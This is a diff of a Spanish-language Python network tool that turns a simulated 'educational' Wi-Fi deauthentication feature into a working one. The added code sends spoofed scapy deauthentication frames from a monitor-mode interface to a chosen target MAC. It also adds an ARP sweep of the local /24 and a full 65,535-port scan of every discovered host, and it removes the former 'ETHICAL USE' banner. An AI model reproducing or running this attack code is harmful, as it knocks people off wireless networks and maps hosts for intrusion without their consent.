@@ -1,162 +1,170 @@
-#!/usr/bin/env python3
-import os
-import time
+import scapy.all as scapy
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 import socket
-import threading
-from scapy.all import ARP, Ether, srp
-import netifaces as ni
+import os
+import netifaces
+import time
 
-# Colores ANSI
-R = "\033[31m"  # Rojo
-G = "\033[32m"  # Verde
-Y = "\033[33m"  # Amarillo
-B = "\033[34m"  # Azul
-C = "\033[36m"  # Cian
-W = "\033[0m"   # Blanco/Reset
+AZUL = "\033[34m"
+ROJO = "\033[31m"
+VERDE = "\033[32m"
+NARANJA = "\033[33m"
+RESET = "\033[0m"
 
-# Función para obtener la red local automáticamente
-def obtener_red_local():
+
+def obtener_ip_local():
+    interfaces = netifaces.interfaces()
+    for interfaz in interfaces:
+        if netifaces.AF_INET in netifaces.ifaddresses(interfaz):
+            ip_info = netifaces.ifaddresses(interfaz)[netifaces.AF_INET][0]
+            ip = ip_info["addr"]
+            if ip.startswith(("192.168.", "10.", "172.")):
+                return ip
+    return None
+
+
+def obtener_nombre(ip):
     try:
-        interfaz = ni.gateways()['default'][ni.AF_INET][1]
-        ip = ni.ifaddresses(interfaz)[ni.AF_INET][0]['addr']
-        mascara = ni.ifaddresses(interfaz)[ni.AF_INET][0]['netmask']
-        bits = sum([bin(int(x)).count('1') for x in mascara.split('.')])
-        return f"{ip}/{bits}"
-    except:
-        return input(f"{Y}No se detectó red automáticamente. Ingresa la red a escanear (ej. 192.168.1.0/24): {W}")
+        return socket.gethostbyaddr(ip)[0]
+    except socket.herror:
+        return "Desconocido"
 
-# Función para escanear dispositivos conectados
-def escanear_dispositivos(red):
-    print(f"\n{C}[+] Escaneando red {red}...{W}")
-    paquetes = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=red)
-    resultado = srp(paquetes, timeout=2, verbose=0)[0]
+
+def escanear_red(ip):
+    print(f"\n[+] Escaneando dispositivos en la red {ip}/24...\n")
+    request = scapy.ARP(pdst=f"{ip}/24")
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    respuesta = scapy.srp(broadcast / request, timeout=2, verbose=False)[0]
 
     dispositivos = []
-    for envio, respuesta in resultado:
-        ip = respuesta.psrc
-        mac = respuesta.hwsrc
-        try:
-            nombre = socket.gethostbyaddr(ip)[0]
-        except:
-            nombre = "Desconocido"
-        sistema = detectar_sistema(mac)
-        dispositivos.append({'ip': ip, 'mac': mac, 'nombre': nombre, 'so': sistema})
-
-    if dispositivos:
-        print(f"\n{G}[✔] Dispositivos encontrados:{W}\n")
-        print(f"{B}{'IP':<17} {'MAC':<20} {'NOMBRE':<30} {'SISTEMA':<10}{W}")
-        print("-" * 80)
-        for d in dispositivos:
-            print(f"{d['ip']:<17} {d['mac']:<20} {d['nombre']:<30} {d['so']:<10}")
-    else:
-        print(f"{R}[!] No se encontraron dispositivos.{W}")
+    for _, recibido in respuesta:
+        ip_dispositivo = recibido.psrc
+        nombre = obtener_nombre(ip_dispositivo)
+        dispositivos.append({"ip": ip_dispositivo, "nombre": nombre})
 
     return dispositivos
 
-# Función para detectar sistema operativo aproximado por MAC
-def detectar_sistema(mac):
-    if mac.startswith("00:1A:79") or mac.startswith("F4:5C:89"):
-        return "Windows"
-    elif mac.startswith("D4:F4:6F") or mac.startswith("28:37:37"):
-        return "Android"
-    elif mac.startswith("3C:07:54") or mac.startswith("F0:18:98"):
-        return "Mac"
-    elif mac.startswith("7C:D1:C3") or mac.startswith("AC:29:3A"):
-        return "iOS"
-    else:
-        return "Desconocido"
 
-# Escaneo de puertos de un dispositivo
-def escanear_puertos(ip):
-    print(f"\n{C}[+] Escaneando puertos abiertos en {ip}...{W}")
-    puertos_abiertos = []
+def obtener_velocidad():
+    print(f"{NARANJA}\nSeleccione la velocidad de escaneo:")
+    print(f"{NARANJA}1. Lento (2 segundos por puerto)")
+    print(f"{NARANJA}2. Rápido (0.5 segundos por puerto)")
+    print(f"{NARANJA}3. Súper rápido (0.1 segundos por puerto)")
+    print(f"{NARANJA}4. Ultra rápido (0.01 segundos por puerto)")
+    print(RESET)
+    opcion = input("Seleccione una opción: ")
+    velocidades = {"1": 2, "2": 0.5, "3": 0.1, "4": 0.01}
+    return velocidades.get(opcion, 0.5)
 
-    def scan_port(port):
-        sock = socket.socket()
-        sock.settimeout(0.5)
-        try:
-            sock.connect((ip, port))
-            puertos_abiertos.append(port)
-        except:
-            pass
+
+def escanear_puertos(ip, nombre):
+    timeout = obtener_velocidad()
+    print(f"\nEscaneando puertos en {ip} ({nombre})...\n")
+    
+    # Recorre todos los puertos del 1 al 65535
+    for puerto in range(1, 65536):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        
+        resultado = sock.connect_ex((ip, puerto))
+        estado = "abierto" if resultado == 0 else "cerrado"
+        color = VERDE if resultado == 0 else ROJO
+        
+        print(f"{color}{puerto} {estado} {ip} {nombre}{RESET}")
         sock.close()
 
-    hilos = []
-    for puerto in range(1, 1025):
-        t = threading.Thread(target=scan_port, args=(puerto,))
-        hilos.append(t)
-        t.start()
 
-    for t in hilos:
-        t.join()
+def desautenticar(target_mac, ap_mac, interface, count=100):
+    print(f"\n[!] Enviando {count} paquetes de deautenticación a {target_mac} desde {ap_mac} usando {interface}...\n")
+    pkt = RadioTap() / \
+          Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / \
+          Dot11Deauth(reason=7)
+    try:
+        for i in range(count):
+            scapy.sendp(pkt, iface=interface, verbose=0)
+            print(f"[{i+1}] Paquete enviado a {target_mac}")
+            time.sleep(0.1)
+        print("\n[✔] ¡Desautenticación completada!\n")
+    except KeyboardInterrupt:
+        print("\n[!] Interrumpido por el usuario.\n")
 
-    if puertos_abiertos:
-        print(f"{G}[✔] Puertos abiertos en {ip}:{W} {puertos_abiertos}")
-    else:
-        print(f"{R}[!] No se encontraron puertos abiertos en {ip}.{W}")
 
-# Desautenticación simulada (educativo)
-def ataque_desautenticacion(ip, mac):
-    print(f"{Y}[!] Función educativa: desautenticando {ip} ({mac})...{W}")
-    print(f"{R}[!] Esto requeriría modo monitor y permisos root (uso real con aireplay-ng).{W}")
-    time.sleep(2)
-    print(f"{G}[✔] Simulación completada.{W}")
-
-# Guardar resultados en archivo
-def guardar(dispositivos):
-    nombre = f"resultado_escaneo.txt"
-    with open(nombre, "w") as f:
-        f.write("IP\tMAC\tNOMBRE\tSO\n")
-        for d in dispositivos:
-            f.write(f"{d['ip']}\t{d['mac']}\t{d['nombre']}\t{d['so']}\n")
-    print(f"{G}[✔] Resultados guardados en {nombre}{W}")
-
-# Menú principal
 def menu():
+    os.system("clear" if os.name != "nt" else "cls")
+    print(f"""{NARANJA}
+███   ███  ██████            ██████     ██     ██████    █████             █████     ████     ██     ██   ██           ██████   ███████  █████
+ ███ ███   ██  ██            ██  ██   ████    █ ███ █   ██   ██           ██   ██   ██  ██   ████    ███  ██            ██  ██   ██   █   ██ ██
+ ███████   ██  ██            ██  ██  ██  ██     ██     ██   ██           █        ██       ██  ██   ████ ██            ██  ██   ██ █     ██  ██
+ ███████   █████             █████   ██  ██     ██     ██   ██  ██████    █████   ██       ██  ██   ██ ████  ██████    █████    ████     ██  ██
+ ██ █ ██   ██ ██             ██      ██████     ██     ██   ██                ██  ██       ██████   ██  ███            ██ ██    ██ █     ██  ██
+ ██   ██   ██  ██    ██      ██      ██  ██     ██     ██   ██           ██   ██   ██  ██  ██  ██   ██   ██            ██  ██   ██   █   ██ ██
+ ██   ██  ████ ██    ██     ████     ██  ██    ████     █████             █████     ████   ██  ██   ██   ██           ████ ██  ███████  █████
+                                                 
+Versión: 1.5.0
+Autor: MR.Pato
+{RESET}
+{AZUL}[1] Escanear dispositivos en la red (Scapy)
+[2] Escanear puertos abiertos en dispositivos detectados
+[3] Escanear puertos en una IP específica
+[4] Desautenticar dispositivo WiFi (requiere interfaz en modo monitor)
+[5] Salir{RESET}
+""")
+
+
+def main():
+    ip_local = obtener_ip_local()
+    if not ip_local:
+        print("No se pudo determinar la IP local. Asegúrate de estar conectado a una red.")
+        return
+
+    dispositivos = []
+
     while True:
-        os.system("clear" if os.name != "nt" else "cls")
-        print(f"""{B}
-╔════════════════════════════════════════════╗
-║     ESCÁNER DE RED LOCAL - ETHICAL USE     ║
-╠════════════════════════════════════════════╣
-║ 1. Escanear dispositivos en la red         ║
-║ 2. Escanear puertos de un dispositivo      ║
-║ 3. Simular desautenticación (educativo)    ║
-║ 4. Salir                                   ║
-╚════════════════════════════════════════════╝{W}""")
-        opcion = input(f"{C}Seleccione una opción: {W}")
+        menu()
+        opcion = input("Seleccione una opción: ")
 
         if opcion == "1":
-            red = obtener_red_local()
-            dispositivos = escanear_dispositivos(red)
+            dispositivos = escanear_red(ip_local)
             if dispositivos:
-                guardar_op = input(f"{Y}¿Deseas guardar los resultados? (s/n): {W}")
-                if guardar_op.lower() == "s":
-                    guardar(dispositivos)
-            input(f"\n{C}Presiona Enter para continuar...{W}")
+                print("\n[+] Dispositivos detectados:")
+                for d in dispositivos:
+                    print(f"    {d['ip']} - {d['nombre']}")
+            else:
+                print("\n[-] No se encontraron dispositivos.")
+            input("\nPresione Enter para continuar...")
 
         elif opcion == "2":
-            ip = input(f"{Y}Ingrese la IP del dispositivo a escanear puertos: {W}")
-            escanear_puertos(ip)
-            input(f"\n{C}Presiona Enter para continuar...{W}")
+            if not dispositivos:
+                print("\n[-] Primero debe escanear los dispositivos con la opción 1.")
+            else:
+                print("\n[+] Escaneando puertos abiertos en todos los dispositivos detectados...\n")
+                for d in dispositivos:
+                    escanear_puertos(d["ip"], d["nombre"])
+            input("\nPresione Enter para continuar...")
 
         elif opcion == "3":
-            ip = input(f"{Y}Ingrese IP del dispositivo a simular desautenticación: {W}")
-            mac = input(f"{Y}Ingrese MAC del dispositivo: {W}")
-            ataque_desautenticacion(ip, mac)
-            input(f"\n{C}Presiona Enter para continuar...{W}")
+            ip_objetivo = input("\nIngrese la IP que desea escanear: ")
+            nombre_objetivo = obtener_nombre(ip_objetivo)
+            print(f"\n[+] Escaneando puertos en {ip_objetivo} ({nombre_objetivo})...\n")
+            escanear_puertos(ip_objetivo, nombre_objetivo)
+            input("\nPresione Enter para continuar...")
 
         elif opcion == "4":
-            print(f"{G}Saliendo...{W}")
+            print("\n[!] Atención: Para desautenticar, la interfaz debe estar en modo monitor.")
+            interface = input("Ingrese la interfaz en modo monitor (ejemplo: wlan0mon): ").strip()
+            ap_mac = input("Ingrese la MAC del punto de acceso (AP): ").strip()
+            target_mac = input("Ingrese la MAC del dispositivo objetivo: ").strip()
+            count = input("Ingrese la cantidad de paquetes a enviar (por defecto 100): ").strip()
+            count = int(count) if count.isdigit() else 100
+            desautenticar(target_mac, ap_mac, interface, count)
+            input("\nPresione Enter para continuar...")
+
+        elif opcion == "5":
+            print("\nSaliendo del programa...")
             break
-
         else:
-            print(f"{R}Opción inválida.{W}")
-            time.sleep(1)
+            print("\n[!] Opción no válida, intente de nuevo.")
 
-# Ejecutar
+
 if __name__ == "__main__":
-    try:
-        menu()
-    except KeyboardInterrupt:
-        print(f"\n{R}Interrumpido por el usuario. Cerrando...{W}")
+    main()
